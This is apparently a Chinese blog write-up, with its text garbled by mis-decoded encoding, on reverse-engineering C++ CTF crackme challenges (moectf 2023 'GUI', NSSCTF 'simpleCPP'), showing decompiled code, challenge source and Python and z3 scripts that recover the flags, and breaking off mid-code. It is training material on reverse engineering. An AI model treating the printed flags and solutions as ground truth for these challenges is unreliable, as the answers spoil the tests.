        <content type="html"><![CDATA[<h1>REï¼ˆCPPï¼‰</h1><p>ä¹‹å‰åšçš„cppçš„é¢˜è¿˜æ˜¯å¤ªå°‘äº†ï¼Œä¸€é‡åˆ°è¿™ç§æŠ½è±¡çš„å°±çœ‹éƒ½çœ‹ä¸æ‡‚ï¼Œé‚å†³å®šè¦å¤šåšä¸€ä¸‹è¿™äº›é¢˜ã€‚å†™è¿™ä¸€ç¯‡æ–‡ç« çš„ç›®çš„åœ¨äºæƒ³è¦æé«˜è‡ªå·±å¯¹cppä¸­åç¼–è¯‘çš„ä»£ç çš„ç†è§£ç¨‹åº¦ã€‚ç„¶åç¬”è€…æ„Ÿè§‰ä¹‹å‰çš„æ–‡ç« å¥½åƒéƒ½å¾ˆçœç•¥ï¼Œè¿™æ¬¡å‡†å¤‡å¤šå†™ä¸€ç‚¹æ–‡å­—å’Œå›¾ï¼Œæ¥è®²è§£æ¸…æ¥šã€‚</p><hr><p>é‚£å…ˆç”¨ä¸€é“é¢˜å¼•å…¥å§ã€‚è¿™é“é¢˜æ˜¯moectf2023å¹´çš„</p><h2 id="GUI">GUI</h2><p>å…ˆé€šè¿‡æŸ¥æ‰¾å­—ç¬¦ä¸²æ‰¾åˆ°ä¸»å‡½æ•°</p><p><img src="https://s2.loli.net/2024/03/11/y978CE6XWNuKbjZ.png" alt="image-20240311180850575"></p><p>ä¸»å‡½æ•°å¤§è‡´å°±æ˜¯è¿™æ ·äº†</p><p>é™æ€åŠ åŠ¨è°ƒä¸¤æ­¥æ³•ï¼š</p><ol><li>é™æ€åˆ†æå‘ç°ï¼šåœ¨<code>MessageBoxW(hWndParent, Text, L&quot;hint&quot;, 0);</code>çš„ä½ç½®æ˜¯æ­£ç¡®ä½ç½®ï¼Œç„¶åä¸Šé¢çš„æ¯”è¾ƒæ˜¯ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ï¼Œä¼ å…¥äº†v7å’Œv6ï¼Œ</li><li>ä¸èƒ½é€šè¿‡ç›´æ¥çš„è§‚å¯Ÿå‘ç°v7å’Œv6çš„ç”Ÿæˆï¼Œä½†æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°v7åœ¨<code>sub_B00A0A((int)v7, (int)v8);</code>ç”Ÿæˆï¼Œv6åœ¨<code>same_op(a91);</code>ç”Ÿæˆï¼Œä»¥åŠflagæ˜¯åœ¨<code>GetWindowTextW(DlgItem, flag, 1024);</code>ä½ç½®ç”Ÿæˆ</li><li>é€šè¿‡è§‚å¯Ÿå‡½æ•°åï¼Œå‘ç°flagä¼ å…¥äº†same_op,a91ä¹Ÿä¼ å…¥äº†ã€‚</li></ol><p>é‚£ä¹ˆçœ‹çœ‹a91ï¼Œå®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥å…ˆæå–å‡ºæ¥ï¼Œä¹‹åå¯èƒ½æœ‰ç”¨ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x000F</span>, <span class="number">0x003E</span>, <span class="number">0x0030</span>, <span class="number">0x0027</span>, <span class="number">0x0013</span>, <span class="number">0x0001</span>, <span class="number">0x007D</span>, <span class="number">0x0070</span>, <span class="number">0x0070</span>, <span class="number">0x0003</span>, <span class="number">0x007D</span>, <span class="number">0x0038</span>, <span class="number">0x000E</span>, <span class="number">0x007A</span>, <span class="number">0x0023</span>, <span class="number">0x007C</span>, <span class="number">0x000B</span>, <span class="number">0x001A</span>, <span class="number">0x003C</span>, <span class="number">0x007D</span>, <span class="number">0x0039</span>, <span class="number">0x007F</span>, <span class="number">0x003C</span>, <span class="number">0x004D</span>, <span class="number">0x004D</span>, <span class="number">0x004D</span>, <span class="number">0x0029</span>]</span><br></pre></td></tr></table></figure><p>ç„¶åç¨‹åºè‚¯å®šä¼šè¯»å–flagï¼Œæ‰€ä»¥åŠ¨æ€è°ƒè¯•åœ¨same_op(flag)çš„ä½ç½®ä¸‹æ–­ç‚¹ã€‚</p><p>æ‰“å¼€ä½ç½®çœ‹ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªæ˜¯åœ¨stackä¸­ã€‚å†å°è¯•ä¸‹æ–­ç‚¹ã€‚</p><p>[read and write]</p><p>ç„¶åæ”¾å¼€ç¨‹åºï¼Œç»§ç»­è·‘ã€‚</p><blockquote><p>å¦‚æœæ–­åˆ°æ–­ç‚¹äº†ï¼Œä¸å°å¿ƒåˆ‡å‡ºå»äº†ï¼Œå¯ä»¥åœ¨regçª—å£eipçš„ä½ç½®ç‚¹ç®­å¤´å°±ä¼šè·³è½¬å›å»ã€‚</p></blockquote><p>ç¬¬ä¸€æ¬¡æ–­ï¼š</p><p><img src="https://s2.loli.net/2024/03/11/wMl21Gk4dS73icN.png" alt="image-20240311182131729"></p><p>æ ¹æ®è¿™ä¸ªå‡½æ•°åï¼Œå¾ˆæ˜æ˜¾æ˜¯åœ¨å–lenï¼Œç¬¬äºŒæ¬¡æ–­åˆ°memmoveå‡½æ•°ï¼Œåˆæ˜¯å†…éƒ¨å‡½æ•°ï¼Œç„¶åå†è·‘ä¸€æ¬¡ï¼Œå‡ºé”™äº†QAQï¼Œè¿™è¯´æ˜ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æˆ‘çŒœæƒ³ä¸‹é¢ä¸¤ç§å¯èƒ½ï¼š</p><p>ä¸€ä¸ªæ˜¯ç”¨çš„äºŒçº§æŒ‡é’ˆï¼Œä¸€ä¸ªæ˜¯copyçš„ä¹‹åå°±æ²¡ç”¨äº†</p><p>æ‰€ä»¥å°±èµ°ä¸é€šäº†ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è¡¥å……ä¸€æ‰‹å¥‡æ€ªçš„cppçŸ¥è¯†ï¼š</p><p>æ¯ä¸ªç±»å®ä¾‹åŒ–çš„æ—¶å€™éƒ½æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°/èµ‹å€¼å‡½æ•°å¯¹å…¶èµ‹å€¼ï¼Œæ‰€ä»¥å¦‚æœé‡åˆ°ä¸¤ä¸ªæœ¬æ¥æ˜¯ä¸€æ ·ç±»å‹çš„å€¼è¿›äº†åŒä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥å¤§èƒ†å‡è®¾å®ƒä»¬å˜æˆäº†ä¸€ä¸ªç±»å‹ï¼Œè€Œè¿™ä¸ªé¢˜a91å’Œflagéƒ½æ˜¯è¿™æ ·ï¼ŒåŒæ—¶a91ç»è¿‡å‡½æ•°åv6å°±è¢«èµ‹å€¼äº†ï¼Œå¯ä»¥çŒœæµ‹v6å°±æ˜¯a91å˜æˆç±»ä¹‹åçš„åœ°å€ï¼Œè€Œflagä¹‹åè¿˜è¿›è¡Œäº†ä¸€æ¬¡åŠ å¯†ï¼Œæœ€åçš„å€¼åº”è¯¥æ˜¯ä»v8åˆ°v7ï¼Œåªæœ‰è¿›å…¥è¿™ä¸ªå‡½æ•°æŸ¥çœ‹çš„æ—¶å€™ï¼Œä¼šå‘ç°v4å’Œv3çš„å€¼çš„å«ä¹‰</p><p><img src="https://s2.loli.net/2024/03/13/gcHhy3RzL1DXMk4.png" alt="image-20240313203446714"></p><p>è™½ç„¶ä¸çŸ¥é“a2æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯åŠ¨è°ƒä¹‹åéƒ½ä¼šå‘ç°v4å’Œv3æ˜¯æŒ‡é’ˆï¼Œv4æŒ‡å‘å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªï¼Œv3æŒ‡å‘æœ€åä¸€ä¸ªï¼Œé‚£ä¹ˆåé¢çš„å¾ªç¯å°±æ˜¯åŠ å¯†äº†ã€‚</p><p>å…·ä½“åŠ å¯†è¯­å¥æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = sub_180956(a2);</span><br><span class="line">end = sub_18017C(a2);</span><br><span class="line"><span class="keyword">while</span> ( start != end )</span><br><span class="line">  sub_1816B7((*start++ - <span class="number">5</span>) ^ <span class="number">0x51</span>);</span><br></pre></td></tr></table></figure><p>è€Œæœ€åç¿»çœ‹æºä»£ç å°±çŸ¥é“ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::wstring <span class="title">EncryptFlag</span><span class="params">(<span class="type">const</span> std::wstring&amp; input)</span> </span>&#123;</span><br><span class="line">    std::wstring encrypted;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">wchar_t</span> c : input) &#123;</span><br><span class="line">        <span class="type">wchar_t</span> encryptedChar = (c - <span class="number">5</span>) ^ <span class="number">0x51</span>;  <span class="comment">// åŠ ä¸€æ“ä½œ</span></span><br><span class="line">        encrypted += encryptedChar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™è¡¨æ˜äº†ç¡®å®inputæ˜¯ä¸€ä¸ªç‰¹æ®Šç±»å‹ï¼Œè€Œæºä»£ç é‡Œçš„éå†è¢«è§£é‡Šæˆä¸¤ä¸ªæŒ‡é’ˆçš„æ“ä½œã€‚</p><p>é‚£ä¹ˆä¹Ÿå¯ä»¥ç¡®å®šæœ€åçš„å€¼å°±æ˜¯a91ï¼ŒæŠŠå®ƒé€†è¿ç®—ä¸€ä¸‹å¾—åˆ°flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">b&#x27;\x39\x3b\x31\x0f\x3e\x30\x27\x13\x01\x7d\x70\x70\x03\x7d\x38\x0e\x7a\x23\x7c\x0b\x1a\x3c\x7d\x39\x7f\x3c\x4d\x4d\x4d\x29&#x27;</span></span><br><span class="line">decoded_s = s.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ord_list = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decoded_s]</span><br><span class="line">after = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ord_list:</span><br><span class="line">    this_one = <span class="built_in">chr</span>((c^<span class="number">0x51</span>)+<span class="number">5</span>)</span><br><span class="line">    after += this_one</span><br><span class="line"><span class="built_in">print</span>(after)</span><br><span class="line"><span class="comment"># moectf&#123;GU1&amp;&amp;W1nd0w2_Pr1m3r!!!&#125;</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡è§‚å¯Ÿæºä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        TCHAR buffer[<span class="number">512</span>];</span><br><span class="line">        <span class="built_in">GetWindowText</span>(<span class="built_in">GetDlgItem</span>(hWnd, <span class="number">2</span>), buffer, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">        std::wstring input = buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯¹è¾“å…¥è¿›è¡ŒåŠ å¯†æ“ä½œ</span></span><br><span class="line">        std::wstring encryptedInput = <span class="built_in">EncryptFlag</span>(input);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ­£ç¡®åŠ å¯†åçš„ flag</span></span><br><span class="line">        std::wstring correctEncryptedFlag = <span class="string">L&quot;\x39\x3b\x31\xf\x3e\x30\x27\x13\x1\x7d\x70\x70\x3\x7d\x38\xe\x7a\x23\x7c\xb\x1a\x3c\x7d\x39\x7f\x3c\x4d\x4d\x4d\x29&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (encryptedInput == correctEncryptedFlag) &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Congratulations! flag is correctï¼&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;hint&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Sorry, flag error.&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;hint&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„==ç”±äºç±»å‹ä¸æ˜¯åŸå§‹ç±»å‹ï¼Œæ‰€ä»¥è¿ç®—ç¬¦è¢«é‡è½½äº†</p><p>ç”¨idaè¿›å…¥è¿™ä¸ªå‡½æ•°æŸ¥çœ‹ï¼š</p><p><img src="https://s2.loli.net/2024/03/13/qr52hv9nFy1udDI.png" alt="image-20240313204606697"></p><p>åœ¨ç¬¬ä¸€ä¸ªv6ç­‰äºa2[5]çš„ä½ç½®ï¼Œè¿›å…¥a2çœ‹ç¬¬6ä½æ˜¯ä»€ä¹ˆ</p><p><img src="https://s2.loli.net/2024/03/13/OTvlDcA926toKIM.png" alt="image-20240313204701212"></p><p>è¿›å…¥åˆ†æåå‘ç°ï¼Œç¬¬äº”ä¸ªå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²</p><p>è€Œv5çš„ä½ç½®æ˜¯</p><p><img src="https://s2.loli.net/2024/03/13/jSg3KdxCYT4VXFR.png" alt="image-20240313204929328"></p><p>æ­£ç¡®çš„åŠ å¯†ä¹‹åçš„å€¼ï¼Œè¿™é‡Œä¹Ÿèƒ½çœ‹å‡ºå’Œa91ä¸€æ ·</p><p>è€Œv4æˆ‘æ²¡æœ‰ç¡®å®šï¼Œv2æ˜¯æˆ‘è¾“å…¥çš„å€¼çš„åŠ å¯†ï¼Œé‚£ä¹ˆæœ€åçš„returnå°±å¾ˆæ˜æ˜¾æ˜¯æ¯”è¾ƒå‡½æ•°äº†ï¼Œ(å‡½æ•°åä¸ä¸€æ ·æ˜¯å› ä¸ºä¸­é—´æœ‰è·³è½¬)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">sub_18A7B0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_258024);</span><br><span class="line">  <span class="keyword">return</span> a2 == a4 &amp;&amp; !sub_180654(a1, a3, a2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_18E010</span><span class="params">(<span class="type">unsigned</span> __int16 *a1, <span class="type">unsigned</span> __int16 *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_25801A);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 != *a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    ++a2;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt;= (<span class="type">int</span>)*a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¤§æ¦‚è¿™ä¸ªé¢˜çš„é€»è¾‘å°±æ˜¯è¿™æ ·ã€‚</p><hr><p>æå®Œä¸Šé¢è¿™ä¸ªé¢˜ï¼Œ3å¤©å·²ç»è¿‡å»äº†QAQï¼Œä½†æ˜¯å·®ä¸å¤šç†è§£çš„å°±æ˜¯ï¼Œcppé‡Œé¢å‡½æ•°ç‰¹åˆ«æŠ½è±¡ï¼Œæ‰€ä»¥è¦æ˜¯æ²¡æœ‰ç¬¦å·è¡¨ï¼Œç¡¬æ¨è¶…çº§éš¾æï¼Œè¿˜æ˜¯çŒœå§â€¦</p><h2 id="simpleCPP">simpleCPP</h2><p>è¿™é“é¢˜æœ‰ç¬¦å·è¡¨ï¼Œå¤ªå¥½äº†ï¼Œæ ¹æ®ç¬¦å·è¡¨å°±å¯ä»¥ç›´æ¥çœ‹å‡ºå‡½æ•°çš„ä½œç”¨</p><p>æ¯”å¦‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="built_in">sub_1400019C0</span>(std::cout, <span class="string">&quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;</span>, envp);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_140001B90);</span><br><span class="line"><span class="comment">//å°±æ˜¯</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="built_in">sub_1400019C0</span>(std::cout, <span class="string">&quot;Let&#x27;s start our game,Please input your flag:&quot;</span>, v5);</span><br><span class="line"><span class="built_in">sub_140001DE0</span>(std::cin, Block);</span><br><span class="line"><span class="comment">//å°±æ˜¯</span></span><br><span class="line"><span class="comment">//cout &quot;Let&#x27;s start our game,Please input your flag:&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">// cin &lt;&lt; Block;</span></span><br></pre></td></tr></table></figure><p>ååˆ†æ–¹ä¾¿</p><p>è¿™ç§é¢˜å°±å¯ä»¥ç›´æ¥åˆ†æäº†ã€‚</p><p>mopå¥½åƒä¼šå †æ ˆä¸å¹³è¡¡ï¼Œäºæ˜¯ç”¨æ”¹æ ‡å¿—ä½è·³è¿‡ã€‚</p><p>åˆ†æä¸€ä¸‹ï¼š</p><p>å…ˆæ˜¯å¯¹è¾“å…¥å¼‚æˆ–ï¼Œç„¶åæ¯8ä½é¡ºåºè¯»å–åˆæˆä¸€ä¸ªå˜é‡ï¼Œæœ€åå¯¹4ä¸ªå˜é‡æ‰§è¡Œæ–¹ç¨‹ä¸Šçš„æ“ä½œ</p><p>æ‰€ä»¥ç›´æ¥é€†å‘ï¼Œå…ˆz3ï¼Œç„¶åå¾—ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r1 = BitVec(<span class="string">&#x27;r1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">r2 = BitVec(<span class="string">&#x27;r2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">r3 = BitVec(<span class="string">&#x27;r3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">j = BitVec(<span class="string">&#x27;j&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v22 = r2 &amp; r1</span><br><span class="line">v23 = r3 &amp; ~r1</span><br><span class="line">v24 = ~r2</span><br><span class="line">v25 = r3 &amp; v24</span><br><span class="line">v26 = r1 &amp; v24</span><br><span class="line">v28 = r2</span><br><span class="line">v29 = r3</span><br><span class="line">flag = r3 &amp; v24 &amp; r1 | r3 &amp; (r2 &amp; r1 | r2 &amp; ~r1 | ~(r2 | r1))</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(r3 &amp; ~r1 == <span class="number">0x11204161012</span>)</span><br><span class="line">s.add(flag == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(r3 &amp; ~r1 | r2 &amp; r1 | r3 &amp; v24 | r1 &amp; v24 == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add(((r3 &amp; ~r1 | r2 &amp; r1 | r3 &amp; v24 | r1 &amp; ~r2) ^ j) == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line">s.add((r3 &amp; ~r1 | r2 &amp; r1 | r2 &amp; r3) == (~r1 &amp; r3 | <span class="number">0xC00020130082C0C</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution found:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r1 = &quot;</span>, m[r1])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r2 = &quot;</span>, m[r2])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r3 = &quot;</span>, m[r3])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;j = &quot;</span>, m[j])</span><br><span class="line">    <span class="comment"># æ·»åŠ æ–°çš„çº¦æŸæ¡ä»¶æ¥æ’é™¤å½“å‰çš„è§£ï¼Œä¸€å®šè¦æ˜¯Or,å¯èƒ½å‡ºç°æœ‰ä¸€ä¸ªå€¼ä¸å®Œå…¨çº¦æŸçš„æƒ…å†µ</span></span><br><span class="line">    s.add(Or(r1 != m[r1], r2 != m[r2], r3 != m[r3], j != m[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æˆ‘å†™çš„æ˜¯s.add(And(r1 != m[r1], r2 != m[r2], r3 != m[r3], j != m[j]))ï¼Œåªæœ‰ä¸€ä¸ªè§£ä½†æ˜¯æ€ä¹ˆéƒ½å‡ºä¸æ¥ï¼Œæœ€åå‘ç°åŸæ¥æ˜¯ç”¨Or,ä½†æ˜¯æœ€åè¿˜æ˜¯å‡ºä¸æ¥ï¼Œå› ä¸ºr2çš„æƒ…å†µå¤ªå¤šäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x69</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x5F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x3e3a460533286f0d</span>,<span class="number">0x0c00020130082c0c</span>,<span class="number">0x08020717153e3013</span>,<span class="number">0x32310600</span>]</span><br><span class="line">tryi = hextbyte(last,<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">pl(pxor(tryi,key),<span class="string">&quot;NSSCTF&quot;</span>)</span><br><span class="line"><span class="comment"># NSSCTF&#123;We1l_D0ndeajoa_Slgebra_am_i&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿˜æ˜¯ä¸å¯¹ï¼Œçœ‹äº†wpå‘ç°æ¯”èµ›ä¸­é—´ç»™äº†hintæŠŠä¸­é—´ä¿®æ”¹å³å¯<code>e!P0or_a</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;We<span class="number">1</span>l_D<span class="number">0</span><span class="keyword">ne</span><span class="title">!P0or_algebra_am_i</span>&#125;</span><br></pre></td></tr></table></figure><hr><p>å†™äº†ä¸¤é“cppï¼Œå…¶å®å†…æ ¸è¿˜æ˜¯åˆ†æå‡½æ•°ä½œç”¨ï¼Œç„¶åè¿›è¡Œç®—æ³•é€†å‘ï¼Œä¸‹ä¸€å‘¨å°è¯•å†™ä¸€ç‚¹cppä»£ç ç„¶åçœ‹çœ‹åç¼–è¯‘åçš„æ ·å­</p><h1>REå…¶å®ƒå†…å®¹</h1><h2 id="EZåŠ å¯†å™¨">EZåŠ å¯†å™¨</h2><p>è¿™é¢˜è¶…æŠ½è±¡ï¼Œå…¨æ˜¯æ··æ·†ï¼Œå¯ä»¥è¯´æ ¹æœ¬ä¸çŸ¥é“åœ¨å¹²ä»€ä¹ˆï¼Œä½†æ˜¯ç”±äºè¾“å…¥çš„é•¿åº¦å¾ˆå°‘ï¼ŒåŸºæœ¬ä¸Šçˆ†ç ´å°±å¯ä»¥è§£å†³ã€‚</p><p>ä¸»å‡½æ•°æ˜¯ä¸€ä¸ªæ£€æŸ¥å‡½æ•°+base64åŠ å¯†å‡½æ•°+DESåŠ å¯†å‡½æ•°+æœ€åçš„è½¬hexå­—ç¬¦</p><p>ä¸€ä¸ªä¸€ä¸ªåˆ†æ</p><p><img src="https://s2.loli.net/2024/03/13/dVw5meqJz9fX42a.png" alt="image-20240313215958869"></p><p>æ€•æ˜¯åˆ†æä¸å‡ºæ¥ä»€ä¹ˆã€‚ã€‚æ‰€ä»¥å°±è¿›å…¥äº†æ¯ä¸ªå‡½æ•°æŠŠæ‰€æœ‰é€»è¾‘å¤åˆ¶ä¸‹æ¥ç„¶åçˆ†ç ´</p><p>ç¬¬ä¸€ä¸ªå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span 